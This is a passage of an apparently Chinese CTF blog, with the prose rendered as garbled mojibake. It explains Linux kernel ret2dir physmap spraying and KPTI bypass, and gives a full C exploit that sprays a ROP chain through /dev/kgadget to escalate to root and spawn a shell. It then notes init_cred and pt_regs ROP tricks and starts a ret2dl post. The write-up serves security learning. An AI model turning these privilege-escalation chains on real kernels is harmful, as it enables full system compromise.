<p>ä¸Šå›¾æ˜¯å†…æ ¸çš„è™šæ‹Ÿåœ°å€æ®µï¼Œå…¶ä¸­<code>physmap</code>å°±å¤„äº<code>0xffff888000000000 - 0xffffc87fffffffff</code>,è¿™æ®µåœ°å€å¯¹åº”çš„å†…å­˜å¤§å°ä¸€å…±æ˜¯64TBï¼Œåœ¨x86_64ç³»ç»Ÿä¸­ï¼Œphysmapç›´æ¥ä»¥1:1çš„æ–¹å¼è¿›è¡Œæ˜ å°„ï¼Œä»0é¡µè¡¨å¼€å§‹ï¼Œå°†æ•´ä¸ªRAMæ”¾è¿›64Tçš„åŒºåŸŸä¸­ï¼Œæˆ‘ç†è§£çš„å°±æ˜¯64ä½æ¶æ„ä¸‹ï¼Œ<code>physmap</code>æ˜ å°„äº†æ‰€æœ‰çš„ç‰©ç†å†…å­˜ã€‚æ‰€ä»¥ç”¨æˆ·æ€å¯¹åº”çš„ç‰©ç†å†…å­˜ä¹Ÿè¢«<code>physmap</code>æ˜ å°„,è¿™å°±ä¼šé€ æˆåˆ«ååœ°å€çš„å‡ºç°ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç”¨æˆ·æ€å¸ƒç½®å¥½ropæˆ–è€…shellcodeï¼Œç„¶ååœ¨å†…æ ¸æ€é€šè¿‡<code>physmap</code>å°±å¯ä»¥è®¿é—®åˆ°ï¼Œæ­¤æ—¶ä¸ä¼šè§¦å‘smepå’Œsmapï¼Œå› ä¸º<code>physmap</code>æœ¬èº«å°±å¤„äºå†…æ ¸æ€çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå±äºå†…æ ¸æ€çš„å†…å®¹ã€‚</p>
<h3 id="0x1-2-åˆ©ç”¨æ–¹å¼"><a href="#0x1-2-åˆ©ç”¨æ–¹å¼" class="headerlink" title="0x1.2 åˆ©ç”¨æ–¹å¼"></a>0x1.2 åˆ©ç”¨æ–¹å¼</h3><p>ä¸€å…±æœ‰ä¸¤ç§åˆ©ç”¨æ–¹å¼</p>
<p><strong>ç²¾å‡†å‘½ä¸­</strong>:å¯ä»¥é€šè¿‡mmapç”³è¯·ä¸€é¡µå¤§å°çš„å†…å®¹ï¼Œç„¶ååœ¨ä¸Šé¢å†™ä¸Šè‡ªå·±çš„ropæˆ–è€…shellcode.ç„¶åé€šè¿‡kmallocç”³è¯·å †ï¼Œè¿™ä¸ªå †æ¥è‡ªäº<code>physmap</code>çº¿æ€§æ˜ å°„åŒº(physmapçš„å­˜åœ¨å°±æ˜¯æ–¹ä¾¿kmalloc),ç„¶åæ³„éœ²å †çš„åœ°å€ï¼Œå°±å¯ä»¥çŸ¥é“<code>physmap</code>çš„åŸºåœ°å€äº†ï¼Œç„¶åè¿›è¡Œå†…å­˜æœç´¢ï¼Œæ‰¾åˆ°ropæˆ–è€…shellcodeçš„çº¿æ€§æ˜ å°„åœ°å€æ¥getshell.</p>
<p><strong>æ¦‚ç‡å‘½ä¸­</strong>:å­¦åå«<code>physmap spray</code>,é€šè¿‡mmapå¤§é‡çš„é¡µåœ°å€ï¼Œç„¶åå…¨éƒ¨å†™ä¸Šç›¸åŒçš„ropæˆ–è€…shellcode,ç„¶åéšæœºæŒ‘é€‰ä¸€ä¸ª<code>physmap</code>ä¸Šä¸€ä¸ªé¡µåŸºå€è¿›è¡Œåˆ©ç”¨ã€‚åªè¦ç”³è¯·çš„è¶³å¤Ÿå¤šï¼Œå°±æœ‰å¾ˆå¤§æ¦‚ç‡å‘½ä¸­ã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯é«˜ç‰ˆæœ¬çš„<code>physmap</code>åªæœ‰è¯»å†™æƒé™ï¼Œæ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½æ˜¯rop.</p>
<h2 id="0x2-KPTI"><a href="#0x2-KPTI" class="headerlink" title="0x2 KPTI"></a>0x2 KPTI</h2><p>åšè¿™é“é¢˜çš„æ—¶å€™å®‰æ’å¥½æ­£å¸¸çš„è¿”å›ç”¨æˆ·æ€çš„<code>swapgs</code>å’Œ<code>iretq</code>ï¼Œè¿”å›ç”¨æˆ·æ€åç›´æ¥çˆ†æ®µé”™è¯¯ï¼Œè·³äº†åŠå¤©ä¹Ÿæ²¡è°ƒå‡ºæ¥ä¸ªæ‰€ä»¥ç„¶ï¼Œé—®äº†ç†Šçˆ¹è¯´å’ŒKPTIæœ‰å…³æˆ‘æ‰ååº”è¿‡æ¥ã€‚</p>
<p>LPTIçš„å…·ä½“åŸç†å¯ä»¥å‚çœ‹<a target="_blank" rel="noopener" href="https://blog.csdn.net/pwl999/article/details/112686914">(12æ¡æ¶ˆæ¯) Linux mem 2.3 å†…æ ¸é¡µè¡¨éš”ç¦» (KPTI) è¯¦è§£_pwl999çš„åšå®¢-CSDNåšå®¢_å†…æ ¸é¡µè¡¨éš”ç¦»</a>ï¼Œç»•è¿‡æ–¹å¼å¯ä»¥çœ‹<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006">Linux Kernel KPTIä¿æŠ¤ç»•è¿‡ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>
<p>ç®€è€Œè¨€ä¹‹ï¼Œå¦‚æœå¼€å¯äº†KPTIçš„è¯ï¼Œè¦æƒ³ä»å†…æ ¸æ€è¿›å…¥ç”¨æˆ·æ€ï¼Œè¿˜å¾—è®¾ç½®cr3çš„å€¼ï¼Œè®©å…¶æˆ–ä¸Š0x1000å°±è¡Œï¼Œå¯ä»¥ä½¿ç”¨gadgetæ¥å®Œæˆï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>swapgs_restore_regs_and_return_to_usermode+27</code>æ¥å®Œæˆã€‚</p>
<p>æˆ‘æ¯”è¾ƒç–‘æƒ‘çš„æ˜¯å½“cr3çš„å€¼æŒ‡å‘äº†ç”¨æˆ·æ€çš„PGDä»¥åè¿˜å¾—æ‰§è¡Œå†…æ ¸æ€çš„<code>swapgs</code>å’Œ<code>iretq</code>,ä¸å°±ä¼šåœ¨TLBä¸­æ‰¾ä¸è§å¯¹åº”çš„ç‰©ç†åœ°å€äº†å—ã€‚ğŸ¤”,ç›®å‰æˆ‘è¿˜æ— æ³•è§£ç­”.</p>
<h2 id="0x3-è„šæœ¬"><a href="#0x3-è„šæœ¬" class="headerlink" title="0x3 è„šæœ¬"></a>0x3 è„šæœ¬</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0xffffffff810c92e0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0xffffffff810c9540</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rsp_ret=<span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0xe8_pop_rbx_rbp_ret=<span class="number">0xffffffff812bd353</span>;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0xa0_pop_rbx_r12_r13_rbp_ret=<span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi=<span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="keyword">size_t</span> ret=<span class="number">0xffffffff8110197b</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_pop_rbp_ret=<span class="number">0xffffffff81bb99af</span>;</span><br><span class="line"><span class="keyword">size_t</span> iretq=<span class="number">0xffffffff810002df</span>;</span><br><span class="line"><span class="keyword">size_t</span> mov_rsi_rax_ret=<span class="number">0xffffffff81bbdc9c</span>;</span><br><span class="line"><span class="keyword">size_t</span>  init_cred = <span class="number">0xffffffff82a6b700</span>;</span><br><span class="line"><span class="keyword">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span> + <span class="number">27</span>;</span><br><span class="line"><span class="comment">// ffffffff81029e51:	48 89 c7             	mov    %rax,%rdi</span></span><br><span class="line"><span class="comment">// ffffffff81029e54:	89 d8                	mov    %ebx,%eax</span></span><br><span class="line"><span class="comment">// ffffffff81029e56:	5b                   	pop    %rbx</span></span><br><span class="line"><span class="comment">// ffffffff81029e57:	5d                   	pop    %rbp</span></span><br><span class="line"><span class="comment">// ffffffff81029e58:	48 09 f8             	or     %rdi,%rax</span></span><br><span class="line"><span class="comment">// ffffffff81029e5b:	c3                   	retq  </span></span><br><span class="line"><span class="keyword">size_t</span> mov_rdi_rax=<span class="number">0xffffffff81029e51</span>;</span><br><span class="line"><span class="keyword">size_t</span> try_hit ;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">void</span> *physmap_spray_arr[<span class="number">16000</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell pk&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp,user_bp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_bp, rbp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rop_chain</span><span class="params">(<span class="keyword">size_t</span> *rop)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;idx&lt;(page_size/<span class="number">8</span><span class="number">-0x40</span>);idx++)&#123;</span><br><span class="line">        rop[idx]=add_rsp_0xa0_pop_rbx_r12_r13_rbp_ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(;idx&lt;(page_size/<span class="number">8</span><span class="number">-0x30</span>);idx++)&#123;</span><br><span class="line">        rop[idx]=ret;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[idx++]=pop_rdi;</span><br><span class="line">    rop[idx++]=<span class="number">0</span>;</span><br><span class="line">    rop[idx++]=prepare_kernel_cred;</span><br><span class="line">    rop[idx++]=mov_rdi_rax;</span><br><span class="line">    rop[idx++]=<span class="number">1</span>;</span><br><span class="line">    rop[idx++]=<span class="number">1</span>;</span><br><span class="line">    rop[idx++]=commit_creds;</span><br><span class="line">    rop[idx++]=swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    rop[idx++]=<span class="number">0</span>;</span><br><span class="line">    rop[idx++]=<span class="number">0</span>;</span><br><span class="line">    rop[idx++] = (<span class="keyword">size_t</span>)usr_shell;         <span class="comment">// rip </span></span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    fd=open(<span class="string">&quot;/dev/kgadget&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open fail\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    physmap_spray_arr[<span class="number">0</span>]=mmap(<span class="literal">NULL</span>,page_size,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!physmap_spray_arr[<span class="number">0</span>])&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mmap fail\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rop_chain(physmap_spray_arr[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">15000</span>;i++)&#123;</span><br><span class="line">        physmap_spray_arr[i]=mmap(<span class="literal">NULL</span>,page_size,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(!physmap_spray_arr[i])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap fail\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="number">0</span>], page_size);</span><br><span class="line">    &#125;</span><br><span class="line">    try_hit= <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x1111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x2222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x3333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x4444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0x5555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, 0x6666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x7777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x8888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,  pop_rsp_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,  try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x1bf52;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é™¤äº†<code>ret2dir</code>å’Œ<code>KPTI</code>ç»•è¿‡ä»¥å¤–ï¼Œè¿˜å­¦åˆ°äº†ä¸¤ä¸ªé›¶ç¢çš„çŸ¥è¯†</p>
<p><strong>init_cred</strong>:ä¸€èˆ¬ä½¿ç”¨<code>commit_creds(prepare_kernel_cred(0))</code>æ¥å®Œæˆææƒï¼ŒåŸç†å°±æ˜¯<code>prepare_kernel_cred(0)</code>ä¼šè¿”å›ä¸€ä¸ªrootæƒé™çš„credï¼Œç„¶å<code>commit_creds()</code>å°†è¿™ä¸ªæ–°credè®¾ç½®æˆè¿™ä¸ªè¿›ç¨‹çš„cred,è¿™ä¸ªæ¯”è¾ƒéº»çƒ¦çš„ä¸€ç‚¹æ˜¯<code>mov rdi,rax,ret</code>æ¯”è¾ƒéš¾æ‰¾ï¼Œåœ¨å®˜æ–¹wpé‡Œä»–ç›´æ¥ä½¿ç”¨äº†ä¸€ä¸ªcred<code>init_cred</code>ï¼Œè¿™ä¸ªcredæ˜¯ä¸€ä¸ªrootæƒé™çš„cred,æ‰€ä»¥å¯ä»¥ç›´æ¥<code>commit_creds(init_cred)</code>,å…¶ä¸­<code>init_cred</code>å¯ä»¥ç›´æ¥åœ¨<code>/proc/kallsyms</code>ä¸­æ‰¾è§ã€‚</p>
<p><strong>pt_regs</strong>:è¿™æ˜¯ä¸€ä¸ªç”±å¯„å­˜å™¨çš„å€¼ç»„æˆçš„ç»“æ„ä½“</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å½“ç”¨æˆ·æ€ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸æ€çš„æ—¶å€™ï¼Œå°±ä¼šæŠŠæ‰€æœ‰çš„å¯„å­˜å™¨çš„å€¼å‹å…¥å†…æ ¸æ ˆåº•ï¼Œä¹Ÿå°±ç»„æˆäº†<code>pt_regs</code>ç»“æ„ä½“ã€‚å…¶ä¸­<code>r15~r8</code>å¯„å­˜å™¨æ˜¯å¯ä»¥åœ¨ç”¨æˆ·æ€é€šè¿‡å†…è”æ±‡ç¼–æ§åˆ¶çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ§åˆ¶å†…æ ¸æ ˆåº•çš„æ•°æ®äº†ï¼Œå¦‚æœæˆ‘ä»¬è¿˜èƒ½æ§åˆ¶ä¸€æ¬¡ç¨‹åºæµæ¯”å¦‚è¯´è™šè¡¨ä¸­çš„æŸä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå½“è°ƒç”¨è¿™ä¸ªæŒ‡é’ˆçš„æ—¶å€™ï¼Œä»–åˆ°å†…æ ¸æ ˆåº•çš„åç§»æ˜¯å›ºå®šçš„ï¼Œé‚£å°±å¯ä»¥é€šè¿‡æŠŠå‡½æ•°æŒ‡é’ˆè¦†ç›–æˆgadgetè·³åˆ°<code>r15~r8</code>ä¹‹é—´å®Œæˆrop</p>
<p>gadgetçš„æ¿å­ï¼š<code>add rsp, val ; ret</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/27/Dest0g3-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/27/Dest0g3-pwn/" class="post-title-link" itemprop="url">Dest0g3-pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-27 13:58:46 / ä¿®æ”¹æ—¶é—´ï¼š13:59:26" itemprop="dateCreated datePublished" datetime="2022-05-27T13:58:46+08:00">2022-05-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Dest0g3-pwn"><a href="#Dest0g3-pwn" class="headerlink" title="Dest0g3  pwn"></a>Dest0g3  pwn</h1><p>ç®—æ˜¯æ¯”è¾ƒç®€å•çš„æ¯”èµ›ï¼Œæ¯•ç«Ÿæˆ‘éƒ½éƒ½åšå‡ºæ¥è¿™ä¹ˆå¤šé¢˜ï¼Œæ‰€æœ‰çš„é¢˜ç›®æ¼æ´éƒ½æ˜¯è£¸çš„ï¼Œæ‰€ä»¥éš¾ç‚¹éƒ½åœ¨å¦‚ä½•åˆ©ç”¨æ¼æ´èº«ä¸Šï¼Œå…¶ä¸­åé¢ä¸‰é“å †é¢˜éƒ½æ˜¯æ”»å‡»ioç»“æ„ï¼Œç¡®å®æœ‰ç‚¹æ¶å¿ƒã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220527125626074.png" alt="image-20220527125626074"></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220527125647780.png" alt="image-20220527125647780"></p>
<h2 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h2><p>ä¸€é“ç®€å•çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰æ‰¾è§libcçš„ç‰ˆæœ¬ï¼ŒåŠ ä¸Šå¼€äº†å»¶è¿Ÿç»‘å®šï¼Œå¿ƒä¸€æ¨ªç›´æ¥æ‹¿ret2dlåšäº†ï¼Œä¸‹é¢ç®€å•æ€»ç»“ä¸€ä¸‹ret2dlæ”»å‡»ã€‚</p>
<p>ä¸»è¦ç»“æ„ä½“å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dynamicæ®µ</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword     d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word  d_val;</span><br><span class="line">        Elf32_Addr  d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span 